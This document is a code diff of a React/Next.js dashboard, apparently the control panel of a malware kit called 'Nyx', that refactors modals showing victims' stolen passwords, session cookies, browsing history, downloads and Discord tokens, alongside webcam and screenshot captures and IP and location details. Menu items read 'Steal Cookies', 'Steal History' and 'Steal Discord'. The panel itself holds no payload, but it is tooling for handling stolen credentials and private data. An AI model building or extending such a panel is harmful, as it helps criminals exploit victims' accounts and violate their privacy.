@@ -8,14 +8,17 @@ import webcam from "@/assets/webcam.png";
 import { HereBackgroundGradientAnimation } from "./ui/background-gradient-animation";
 import Data from "@/data/teste.json";
 import Data2 from "@/data/teste-senhas.json";
-import Data3 from '@/data/teste-cookies.json'
-import Data4 from '@/data/teste-history.json'
-import Data5 from '@/data/teste-downloads.json'
-import Data6 from '@/data/teste-discord.json'
+import Data3 from "@/data/teste-cookies.json";
+import Data4 from "@/data/teste-history.json";
+import Data5 from "@/data/teste-downloads.json";
+import Data6 from "@/data/teste-discord.json";
 import { useParams, useRouter } from "next/navigation";
 import Footer from "./footer/footer";
-import Link from "next/link";
-
+import ModalDiscord from "@/components/Modals/discord/modaldiscord";
+import ModalDownloads from "@/components/Modals/downloads/modaldownloads";
+import ModalHistory from "@/components/Modals/history/ModalHistory";
+import ModalCookies from "@/components/Modals/cookies/modalcookies";
+import ModalPassowrds from "@/components/Modals/senhas/modalsenhas";
 interface User {
   id: number;
   ip: string;
@@ -39,52 +42,6 @@ interface User {
   city: string;
   cep: string;
   isp: string;
-}
-
-interface Senhas {
-  id: number;
-  location: string;
-  password: string;
-  email:string
-}
-
-interface Cookies {
-  id: number;
-  location: string;
-  cookie: string;
-}
-
-
-interface History1{
-  url:string;
-  title:string;
-  visitTime:string;
-  duration:string
-  
-}
-
-
-interface History2{
-  id:number;
-  history: Array<History1>;
-
-}
-
-interface Downloads{
-  id:number;
-  fileName:string;
-  fileSize:string;
-  downloadDate:string
-}
-
-interface DiscordData {
-  id:number;
-  victim:string;
-  username:string;
-  email:string
-  nitro:boolean;
-  token:string;
-  profile_image:string
 }
 
 interface networkDetails {
@@ -129,18 +86,13 @@ export default function Component() {
   const [webcamImage, setWebcamImage] = useState<string | null>(null);
   const [screenshotImage, setScreenshotImage] = useState<string | null>(null);
   const users: User[] = Data;
-  const senhas: Senhas[] = Data2;
-  const biscoitos: Cookies[] = Data3;
-  const history2: History1[] = Data4.flatMap(item => item.history);
-  const dl: Downloads[] = Data5;
-  const dc :DiscordData[] = Data6;
 
   const userInfo = {
     name: "Faccin",
     registeredDate: "2023-01-15",
     expiryDate: "2038-01-15",
   };
-  const rota = useRouter()
+  const rota = useRouter();
 
   useEffect(() => {
     const handleClickOutside = (event: MouseEvent) => {
@@ -216,9 +168,9 @@ export default function Component() {
     setScreenshotImage(null);
   };
 
-  const handleNavegar = (local:string) =>{
-    rota.push(`/${local}`)
-  }
+  const handleNavegar = (local: string) => {
+    rota.push(`/${local}`);
+  };
 
   interface ImageModalProps {
     isOpen: boolean;
@@ -338,7 +290,7 @@ export default function Component() {
                 fc:f0:c3:0f:3c:f0
               </p>
             </div>
-            
+
             <div className="bg-zinc-900 p-4 rounded-md">
               <strong>Country:</strong>
               <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
@@ -401,263 +353,29 @@ export default function Component() {
     );
   };
 
-
-
-
-  function ModalDiscord() {
-    const [isDiscordOpen, setIsDiscordOpen] = useState<boolean>(false);
-  
-    const handleCloseDiscord = () => {
-      setIsDiscordOpen(false);
-    };
-  
-    return (
-      <div className="fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center z-50">
-        <div className="relative bg-zinc-900 p-6 rounded-lg text-white w-11/12 max-w-4xl h-4/5 overflow-y-auto shadow-lg border border-gray-700">
-          {/* Background logo */}
-          <div className="absolute inset-0 flex items-center justify-center opacity-10 pointer-events-none">
-            <Image src={logo} alt="Nyx Logo" width={700} height={700} />
-          </div>
-  
-          {/* Botão de fechar */}
-          <button
-            onClick={handleCloseDiscord}
-            className="text-red-500 hover:text-red-400 self-start text-xl focus:outline-none"
-          >
-            CLOSE
-          </button>
-  
-          {/* Título */}
-          <h1 className="text-3xl font-bold text-center mb-6">Discord Informations</h1>
-  
-          {/* Conteúdo */}
-          <div className="space-y-4">
-            {dc.map(({ id, victim, username, email, nitro, token, profile_image }) => (
-              <div className="grid grid-cols-2 gap-4 bg-zinc-800 p-4 rounded-md shadow-md" key={id}>
-                <div className="flex items-center">
-                  <img src={profile_image} alt="Profile" className="w-16 h-16 rounded-full mr-4" />
-                  <div>
-                    <p className="font-semibold">{victim}</p>
-                    <p className="text-gray-400">{username}</p>
-                    
-                  </div>
-                </div>
-                <div className="flex flex-col justify-center">
-                  <div className="flex items-center">
-                    <span className="mr-2 text-purple-400">Nitro:</span>
-                    <span className="text-gray-300">{nitro ? "Yes" : "No"}</span>
-                  </div>
-                  <div className="flex items-center">
-                    <span className="mr-2 text-purple-400">Email:</span>
-                    <span className="text-gray-300">{email}</span>
-                  </div>
-                  <div className="flex items-center">
-                    <span className="mr-2 text-purple-400">MFA:</span>
-                    <span className="text-gray-300">{false ? "Enabled" : "Disabled"}</span>
-                   
-                  </div>
-                  <div className="flex items-center">
-                  <span className="mr-2 text-purple-400">Token:</span>
-                  <span className="text-gray-300">{token}</span>
-                  </div>
-                </div>
-              </div>
-            ))}
-          </div>
-        </div>
-      </div>
-    );
-  }
-  
-  
-
-
-
-function ModalDownloads() {
-  const [isDownloadsOpen,setIsDownloadsOpen] = useState<boolean>(false)
-  const handleCloseDL = () => {
-    setIsDownloadsOpen(false)
-  } 
-  return(
-    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
-    <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto space-y-6">
-      <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
-        <Image src={logo} alt="Nyx Logo" width={700} height={700} />
-      </div>
-      {/* BotÃ£o de fechar */}
-
-      <button
-        onClick={handleCloseDL}
-        className=" self-start text-red-700"
-      >
-        CLOSE
-      </button>
-      <h1 className="text-3xl font-bold text-center">Donwloads</h1>
-      <div>
-      {dl.map(({id,fileName,fileSize,downloadDate})=>(
-            <div className="grid grid-cols-2 gap-4 ml-auto" key={id}>
-            <div className="bg-zinc-900 p-4 rounded-md">
-              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
-              <Link href={"#"}
-              className="  text-purple-400 hover:underline hover:text-blue-500"
-             >
-              {fileName}
-            </Link>
-              </p>
-              <div className="bg-zinc-900 p-4 rounded-md">
-              <strong className="text-purple-400">{fileSize}</strong>    
-            </div> 
-            </div>
-            <div className="bg-zinc-900 p-4 rounded-md">
-              <strong className="text-purple-400">{downloadDate}</strong>    
-            </div>
-        </div>
-      ))}
-      </div>
-    </div>
-  </div>
-  )
-}
-
-  function ModalHistory() {
-  const [isHistoryOpen, setIsHistoryOpen] = useState<boolean>(false)
-  const handleCloseHistory = () =>{
-    setIsHistoryOpen(false)
-  }
-    return(
-      <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
-        <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto space-y-6">
-          <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
-            <Image src={logo} alt="Nyx Logo" width={700} height={700} />
-          </div>
-          {/* BotÃ£o de fechar */}
-
-          <button
-            onClick={handleCloseHistory}
-            className=" self-start text-red-700"
-          >
-            CLOSE
-          </button>
-          <h1 className="text-3xl font-bold text-center">History</h1>
-          <div>
-            {history2.map(({url,title,visitTime,duration},index)=>(
-               <div className="bg-zinc-900 p-4 rounded-md" key={index}>
-               <strong>{title}</strong>
-               <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
-                  {url}
-               </p>
-               <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
-                  {visitTime}
-               </p>
-               <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
-                  {duration}
-               </p>
-             </div>
-            ))}
-          </div>
-        </div>
-      </div>
-    )
-  }
-
-  function ModalCookies() {
-    const [isCookiesOpen, setIsCookiesOpen] = useState<boolean>(false);
-    const handleCloseCookies = () =>{
-      setIsCookiesOpen(false)
-    }
-
-    return(
-      <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
-        <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto space-y-6">
-          <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
-            <Image src={logo} alt="Nyx Logo" width={700} height={700} />
-          </div>
-          {/* BotÃ£o de fechar */}
-
-          <button
-            onClick={handleCloseCookies}
-            className=" self-start text-red-700"
-          >
-            CLOSE
-          </button>
-          <h1 className="text-3xl font-bold text-center">Cookies</h1>
-          <div>
-            {biscoitos.map(({ id, location, cookie }) => (
-              <div className="bg-zinc-900 p-4 rounded-md" key={id}>
-                <strong>{location}</strong>
-                <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
-                  {cookie}
-                </p>
-              </div>
-            ))}
-          </div>
-        </div>
-      </div>
-    );
-  }
-
-  function ModalPassowrds() {
-    const [isModalOpenSenha, setIsModalOpenSenha] = useState<boolean>(false);
-    const handleCloseModalSenha = () => {
-      setIsModalOpenSenha(false);
-    };
-    return (
-      <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
-        <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto space-y-6">
-          <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
-            <Image src={logo} alt="Nyx Logo" width={700} height={700} />
-          </div>
-          {/* BotÃ£o de fechar */}
-
-          <button
-            onClick={handleCloseModalSenha}
-            className=" self-start text-red-700"
-          >
-            CLOSE
-          </button>
-          <h1 className="text-3xl font-bold text-center">Passwords</h1>
-          <div>
-            {senhas.map(({ id, location, password, email }) => (
-             <div className="grid grid-cols-2 gap-4" key={id}>
-                <div className="bg-zinc-900 p-4 rounded-md">
-                <strong>{location}</strong>
-                </div>
-                <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
-                  {password}
-                </p>
-              </div>
-            ))}
-          </div>
-        </div>
-      </div>
-    );
-  }
-
   function ContextMenu() {
     const [isModalOpenSenha, setIsModalOpenSenha] = useState<boolean>(false);
     const [isCookiesOpen, setIsCookiesOpen] = useState<boolean>(false);
-    const [isHistoryOpen, setIsHistoryOpen] = useState<boolean>(false)
-    const [isDownloadsOpen,setIsDownloadsOpen] = useState<boolean>(false)
+    const [isHistoryOpen, setIsHistoryOpen] = useState<boolean>(false);
+    const [isDownloadsOpen, setIsDownloadsOpen] = useState<boolean>(false);
     const [isDiscordOpen, setIsDiscordOpen] = useState<boolean>(false);
-  
-    
+
     const handleOpenDiscord = () => {
       setIsDiscordOpen(true);
     };
     const handleOpenDL = () => {
-      setIsDownloadsOpen(true)
-    } 
+      setIsDownloadsOpen(true);
+    };
 
-    const handleOpenHistory = () =>{
-      setIsHistoryOpen(true)
-    }
+    const handleOpenHistory = () => {
+      setIsHistoryOpen(true);
+    };
     const handleOpenCookies = () => {
-      setIsCookiesOpen(true)
-    }
+      setIsCookiesOpen(true);
+    };
     const handleOpenModalSenha = () => {
       setIsModalOpenSenha(true);
     };
-
 
     return (
       <div
@@ -711,45 +429,27 @@ function ModalDownloads() {
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Cookies">
-                  <p onClick={handleOpenCookies}>
-                  Steal Cookies
-                  </p>
+                  <p onClick={handleOpenCookies}>Steal Cookies</p>
                 </abbr>
-                <div>
-                  {isCookiesOpen && <ModalCookies/>}
-                </div>
+                <div>{isCookiesOpen && <ModalCookies />}</div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin History">
-                  <p onClick={handleOpenHistory}>
-                  Steal History
-                  </p>
+                  <p onClick={handleOpenHistory}>Steal History</p>
                 </abbr>
-                <div>
-                  {isHistoryOpen && <ModalHistory/>}
-                </div>
+                <div>{isHistoryOpen && <ModalHistory />}</div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Downloads">
-                  <p onClick={handleOpenDL}>
-
-                  Steal Downloads
-                  </p>
+                  <p onClick={handleOpenDL}>Steal Downloads</p>
                 </abbr>
-                <div>
-                  {isDownloadsOpen && <ModalDownloads/>}
-                </div>
+                <div>{isDownloadsOpen && <ModalDownloads />}</div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Discord">
-                  <p onClick={handleOpenDiscord}>
-                  Steal Discord
-
-                  </p>
+                  <p onClick={handleOpenDiscord}>Steal Discord</p>
                 </abbr>
-                <div>
-                  {isDiscordOpen && <ModalDiscord/>}
-                </div>
+                <div>{isDiscordOpen && <ModalDiscord />}</div>
               </div>
             </div>
           )}
@@ -879,8 +579,8 @@ function ModalDownloads() {
           </div>
           <div>
             <button
-            onClick={()=>handleNavegar("")}
-            className="relative w-64 bg-white hover:bg-purple-700 text-black py-2 rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
+              onClick={() => handleNavegar("")}
+              className="relative w-64 bg-white hover:bg-purple-700 text-black py-2 rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
             >
               Back to the main
             </button>
